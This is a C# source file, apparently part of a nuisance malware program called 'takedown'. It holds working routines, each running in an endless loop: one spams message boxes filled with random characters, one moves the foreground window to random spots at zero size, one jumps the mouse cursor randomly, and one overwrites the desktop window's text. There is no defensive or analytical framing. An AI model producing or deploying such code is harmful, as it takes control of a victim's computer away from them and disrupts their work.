using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace takedown
{
    internal class extra
    {
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll", SetLastError = true)]
        internal static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool SetWindowText(IntPtr hwnd, String lpString);

        [DllImport("user32.dll")]
        public static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        public static string UnicodeGenerator(int length)
        {
            Random r = new Random();
            StringBuilder sb = new StringBuilder(length);
            while (sb.Length < length)
            {
                char characters = (char)r.Next(0x20, 0x2AF);
                if (!char.IsControl(characters) && characters != 'd' && characters != 'o')
                    sb.Append(characters);
            }
            return sb.ToString();
        }

        public static void ShowMessage()
        {
            Random r = new Random();
            string title = UnicodeGenerator(r.Next(20));
            string text = UnicodeGenerator(r.Next(20));

            var icons = (MessageBoxIcon[])Enum.GetValues(typeof(MessageBoxIcon));
            var buttons = (MessageBoxButtons[])Enum.GetValues(typeof(MessageBoxButtons));

            MessageBox.Show(text, title, buttons[r.Next(buttons.Length)], icons[r.Next(icons.Length)]);
        }

        public static void StartMessageSpam()
        {
            while (true)
            {
                Random r = new Random();
                new Thread(ShowMessage).Start();
                Thread.Sleep(r.Next(1000));
            }
        }

        public static void MoveForegroundWindow()
        {
            while (true)
            {
                Random r = new Random();
                IntPtr hwnd = GetForegroundWindow();
                int w = Screen.PrimaryScreen.Bounds.Width;
                int h = Screen.PrimaryScreen.Bounds.Height;

                MoveWindow(hwnd, r.Next(w), r.Next(h), 0, 0, true);
                Thread.Sleep(r.Next(1000));
            }
        }

        public static void MoveCursor()
        {
            while (true)
            {
                Random r = new Random();
                int w = Screen.PrimaryScreen.Bounds.Width;
                int h = Screen.PrimaryScreen.Bounds.Height;

                SetCursorPos(r.Next(w), r.Next(h));
                Thread.Sleep(r.Next(1000));
            }
        }

        public static void SetForegroundWindowText()
        {
            while (true)
            {
                IntPtr hwnd = GetDesktopWindow();
                SetWindowText(hwnd, "takedown.exe");
                Thread.Sleep(10);
            }
        }
    }
}